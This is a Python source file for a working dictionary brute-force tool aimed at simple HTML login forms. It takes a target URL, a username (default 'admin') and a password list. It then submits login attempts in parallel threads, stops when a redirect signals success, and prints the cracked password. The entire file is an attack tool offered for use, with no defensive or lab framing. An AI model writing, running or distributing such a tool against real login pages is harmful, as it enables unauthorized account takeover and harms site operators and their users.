# Import necessary modules
import time
from functools import wraps
import requests
from concurrent.futures import ThreadPoolExecutor
from typing import IO
from argparse import FileType, ArgumentParser


# Define a class for handling command-line arguments
class CommandLineInteraction:
    def __init__(self):
        parser = ArgumentParser(description="Bruteforce for simple html form")
        # Define arguments to parse
        parser.add_argument("url", type=str, help="URL to login page")

        parser.add_argument("-d", "--dictionary",
                            type=FileType("r"),
                            help="Password dictionary file",
                            required=True)
        parser.add_argument("-u", "--username",
                            type=str,
                            help='Username to bruteforce(default: "admin")',
                            default="admin")
        parser.add_argument("-n", "--workers",
                            type=int,
                            help='Number of workers to use(default:10)',
                            default=10)
        parser.add_argument("-t", "--timeout",
                            type=int,
                            help='Timeout in milliseconds',
                            default=1)
        self.__arguments = parser.parse_args()

    # Getters for command line arguments
    def get_url(self) -> str:
        return self.__arguments.url

    def get_username(self) -> str:
        return self.__arguments.username

    def get_dictionary(self) -> IO:
        return self.__arguments.dictionary

    def get_number_of_workers(self) -> int:
        return self.__arguments.workers

    def get_timeout(self) -> int:
        return self.__arguments.timeout


# Define a class that performs password check queries
class FormChecker:
    # Constructor takes URL with form (with only username and password fields)
    # and username for which the password will be searched
    def __init__(self, url: str, username: str):
        self.__url = url
        self.__username = username
        self.__session = requests.Session()
        self.password = None

    # Method for checking password
    # Accepts password to check & ThreadPoolExecutor to stop,
    # when password found
    def check(self, password: str, executor: ThreadPoolExecutor):
        password = password.rstrip("\n")
        data = {"username": self.__username, "password": password}
        resp = self.__session.post(self.__url, data=data, allow_redirects=True)
        if (resp is not None) and (len(resp.history) > 0):
            if resp.history[-1].is_redirect:
                if self.password is None:
                    executor.shutdown(wait=False, cancel_futures=True)
                    self.password = password


# Define a timer decorator to measure execution time of functions
def timer(function):
    @wraps(function)
    def wrapper(*args, **kwargs):
        start = time.time()
        result = function(*args, **kwargs)
        end = time.time()
        print("Execution time: " + str(end - start))
        return result

    return wrapper


# Define a class for performing the brute-force attack
class BruteForce:
    # Constructor accepts dictionary file and Form Checker
    def __init__(self, dictionary_file: IO, checker: FormChecker):
        self.__dictionary_file = dictionary_file
        self.__checker = checker

    @timer
    # Method performing attack
    # Submit every password to be checked in ThreadPool
    # Accepts timeout(in ms) & number of workers
    def run(self, timeout, number_of_workers):
        passwords = self.__dictionary_file.readlines()
        with ThreadPoolExecutor(max_workers=number_of_workers) as executor:
            for password in passwords:
                executor.submit(self.__checker.check, password, executor)
                time.sleep(timeout / 1000)
                # Check if password found
                if self.__checker.password is not None:
                    break
            executor.shutdown(wait=True)
        if self.__checker.password is None:
            print("No passwords found")
        else:
            print("Password: " + self.__checker.password)

    def __del__(self):
        self.__dictionary_file.close()


# Main section to parse command-line arguments and initiate the brute-force attack
if __name__ == "__main__":
    cli = CommandLineInteraction()
    form_checker = FormChecker(cli.get_url(), cli.get_username())
    bruteforce = BruteForce(cli.get_dictionary(), form_checker)
    bruteforce.run(cli.get_timeout(), cli.get_number_of_workers())
